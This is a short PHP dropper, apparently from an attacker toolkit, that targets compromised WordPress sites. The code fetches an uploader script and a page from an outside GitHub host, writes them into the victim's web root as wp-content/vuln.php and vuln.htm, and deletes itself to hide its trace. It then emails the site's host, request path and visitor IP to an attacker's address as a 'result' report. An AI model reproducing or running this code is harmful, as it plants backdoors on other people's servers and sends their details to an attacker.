<title>Vuln!! patch it Now!MrSpyUp!!</title>
<?php
function http_get($url){
	$im = curl_init($url);
	curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
	curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($im, CURLOPT_HEADER, 0);
	return curl_exec($im);
	curl_close($im);
}
$check = $_SERVER['DOCUMENT_ROOT'] . "/wp-content/vuln.php" ;
$text = http_get('https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
    echo $check."</br>";
}else 
  echo "not exits";
echo "done .\n " ;

$check2 = $_SERVER['DOCUMENT_ROOT'] . "/vuln.htm" ;
$text2 = http_get('https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/vuln.txt');
$open2 = fopen($check2, 'w');
fwrite($open2, $text2);
fclose($open2);
if(file_exists($check2)){
    echo $check2."</br>";
}else 
  echo "not exits";
echo "done .\n " ;

@unlink(__FILE__);
?>
<?php
$ip = getenv("REMOTE_ADDR");
$ra44 = rand(1, 99999);
$subj98 = " Bot V3 Rzlt |$ip";
$email = "sellerolux@gmail.com";
$from = "From: Result<botv3@mrspybotv3.com";
$a45 = $_SERVER['REQUEST_URI'];
$b75 = $_SERVER['HTTP_HOST'];
$m22 = $ip . "";
$msg8873 = "$a45 $b75 $m22";
mail($email, $subj98, $msg8873, $from);
?>